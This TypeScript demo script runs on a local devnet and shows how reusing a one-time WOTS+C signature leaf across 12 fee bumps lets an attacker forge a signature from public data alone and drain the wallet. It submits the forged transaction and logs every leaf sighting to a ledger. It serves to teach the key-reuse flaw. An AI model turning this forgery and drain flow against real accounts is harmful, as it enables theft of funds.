// Why a one-time key must never sign twice, shown on the live EIP-8141 devnet (chain 1337).
//
// 1. A NAIVE wallet (key "naive") wants to pay a friend. Its transaction is stuck, so it bumps the fee and
//    re-signs 12 times, reusing the same WOTS+C leaf every time (the sigHash covers the fees, so every bump
//    is a new message). Each bump is a valid, broadcastable frame transaction.
// 2. An ATTACKER sees only those public signatures. With the public key alone it forges a signature for its
//    own transaction, which sends the wallet's whole balance to the attacker, and submits it through the
//    alt mempool. The account's VERIFY frame accepts it, because it is a valid signature.
// 3. Every sighting of the leaf goes to the Arkiv leaf ledger, which raises "signed twice".
//
// Lifeboat's own wallet can't do step 1: it reserves a fresh leaf per signing attempt and writes it to disk
// before the signature leaves the process (lib/pqkey.ts). Usage: pnpm --filter @lifeboat/scripts forgery-demo
import { randomBytes } from "node:crypto";
import { concat, formatEther, getAddress, numberToHex, pad, parseEther, parseGwei, type Address, type Hex } from "viem";
import { u64 } from "@arkiv-network/sdk/schema";
import { addr } from "@arkiv-network/sdk/schema";
import { encodeTx, frame, newTx, sigHash, type FrameTx } from "@forshtat/hegota-support/tx";
import { toWire } from "@forshtat/hegota-support/rpc";
import { forge, fromHex, sign, toHex, verify } from "@lifeboat/pq";
import { GATEWAY_URL, MINER_SIDECAR_URL, NODE_URL, devWallet, explorerTx, profile, publicClient, saveEvidence } from "./lib/devnet.js";
import { loadOrCreateKey } from "./lib/pqkey.js";
import { rpc } from "./lib/rpc.js";
import { EXPIRY, Leaf, arkivWallet } from "./lib/arkiv.js";

const BUMPS = 12;
const LEAF = 0;
const { file, key } = loadOrCreateKey("naive");
if (!file.account) throw new Error('run "pnpm deploy-account --label naive --fund 0.02" first');
const account = getAddress(file.account);
const pub = publicClient();
const friend = devWallet().account.address;
const attacker = getAddress(`0x${randomBytes(20).toString("hex")}`);

const [nonce, block, balance] = await Promise.all([pub.getTransactionCount({ address: account }), pub.getBlock(), pub.getBalance({ address: account })]);
const baseFee = block.baseFeePerGas ?? parseGwei("1");
console.log(`naive account ${account}: ${formatEther(balance)} ETH, nonce ${nonce}`);

const executeData = (to: Address, value: bigint): Hex => concat([pad(numberToHex(LEAF), { size: 32 }), pad(to, { size: 32 }), pad(numberToHex(value), { size: 32 })]);
const build = (to: Address, value: bigint, tip: bigint, exec = 80_000n): FrameTx =>
  newTx({
    chainId: 1337n,
    sender: account,
    nonceSeq: BigInt(nonce),
    frames: [frame(profile, "VERIFY", { execution: 60_000n, scope: "EXECUTION_AND_PAYMENT", data: "0x03" }), frame(profile, "SENDER", { execution: exec, state: 200_000n, data: executeData(to, value) })],
    signatures: [{ scheme: 0, signer: "0x", msg: "0x", signature: "0x" }],
    fees: { maxFeePerGas: baseFee * 2n + tip, maxPriorityFeePerGas: tip },
  });

// 1. the naive wallet re-signs its stuck payment 12 times with the SAME leaf (fee bumps)
const observed: { sigHash: Uint8Array; witness: Uint8Array; tip: bigint; hash: Hex }[] = [];
for (let i = 1; i <= BUMPS; i++) {
  const tip = parseGwei(String(i));
  const tx = build(friend, parseEther("0.001"), tip);
  const sh = sigHash(profile, tx);
  const { witness } = sign(key, LEAF, fromHex(sh)); // the mistake: same leaf every time
  observed.push({ sigHash: fromHex(sh), witness, tip, hash: sh });
}
const firstValid = verify(key, observed[0]!.sigHash, observed[0]!.witness);
console.log(`naive wallet signed ${BUMPS} fee bumps (tip 1..${BUMPS} gwei) with leaf ${LEAF}; each is a valid signature: ${firstValid}`);

// 2. the attacker: public key + those signatures only (no secret seed)
const publicOnly = { root: key.root, pubSeed: key.pubSeed };
// leave room for this transaction's own max cost (gas limits x max fee), which the account pays
const stolen = balance - parseEther("0.005");
// paying a brand-new address creates an account, which costs ~180k execution gas on this devnet; the attacker sets its own limits
const attack = build(attacker, stolen, parseGwei("2"), 300_000n);
const target = sigHash(profile, attack);
const t0 = Date.now();
const forged = forge(publicOnly, observed, fromHex(target), 20_000_000);
if (!forged) throw new Error("no forgery found (unlucky draw): rerun");
const forgeMs = Date.now() - t0;
if (!verify(publicOnly, fromHex(target), forged.witness)) throw new Error("forged witness does not verify");
console.log(`attacker forged a signature for "send ${formatEther(stolen)} ETH to ${attacker}" after ${forged.tries.toLocaleString()} tries (${(forgeMs / 1000).toFixed(1)} s), using only public data`);

const tx: FrameTx = { ...attack, signatures: [{ scheme: 0, signer: "0x", msg: "0x", signature: toHex(forged.witness) }] };
const raw = encodeTx(profile, tx);
const sim = await rpc<any>(NODE_URL(), "ethrex_simulateFrameTransaction", [raw, "latest", { trace: false }]);
console.log(`dry run: frames ${JSON.stringify((sim.frames ?? []).map((f: any) => f.succeeded))}, VERIFY gas ${parseInt(sim.frames?.[0]?.gasUsed ?? "0x0", 16)}`);
if (sim.failedFrameIndex !== undefined && sim.failedFrameIndex !== null) throw new Error(`forged tx fails in frame ${sim.failedFrameIndex}`);

const via = process.argv.includes("--via-miner") ? MINER_SIDECAR_URL() : GATEWAY_URL();
const hash = await rpc<Hex>(via, "eth_sendFrameTransaction", [toWire(tx)], { retries: 1 });
console.log(`submitted to the alt mempool at ${new URL(via).host}`);
let receipt: any = null;
for (let i = 0; i < 60 && !receipt; i++) {
  receipt = await rpc(NODE_URL(), "eth_getTransactionReceipt", [hash]).catch(() => null);
  if (!receipt) await new Promise((r) => setTimeout(r, 3000));
}
const after = { account: formatEther(await pub.getBalance({ address: account })), attacker: formatEther(await pub.getBalance({ address: attacker })) };
console.log(`FORGED TX ${receipt ? `INCLUDED in block ${BigInt(receipt.blockNumber)}, status ${receipt.status}` : "not included yet"}: ${hash}\n${explorerTx(hash)}`);
console.log(`after: naive account ${after.account} ETH, attacker ${after.attacker} ETH`);

// 3. the leaf ledger sees every use of leaf 0, from the 12 bumps and the forgery
const { client } = arkivWallet();
const onlyForged = process.argv.includes("--only-forged-sighting");
const entries = [
  ...(onlyForged ? [] : observed).map((o, i) => ({ digest: o.hash, tx: `fee bump #${i + 1} (tip ${i + 1} gwei): broadcast, replaced` })),
  { digest: target, tx: hash },
].map((e) => ({
  schema: Leaf,
  values: { root: file.root, leaf: u64(BigInt(LEAF)), account: addr(account), chainId: u64(1337n), digest: e.digest, txHash: e.tx },
  expiration: EXPIRY.leaf(),
  flags: { readonly: true, permissionlessExtension: true },
}));
const batch = await client.executeBatch({ creates: entries as any });
console.log(`published ${batch.createdEntities.length} leaf sightings to Arkiv (tx ${batch.txHash}): the ledger now shows leaf ${LEAF} signing ${entries.length} different messages`);

saveEvidence("forgery", {
  chainId: 1337,
  naiveAccount: account,
  root: file.root,
  leaf: LEAF,
  bumps: observed.map((o) => ({ tipGwei: Number(o.tip / 1_000_000_000n), sigHash: o.hash })),
  attacker,
  stolenWei: stolen,
  forge: { tries: forged.tries, ms: forgeMs, counter: forged.counter, minPositions: forged.minPositions },
  forgedTx: hash,
  explorer: explorerTx(hash),
  receipt,
  after,
  arkiv: { txHash: batch.txHash, entities: batch.createdEntities },
  simulation: { frames: sim.frames },
});
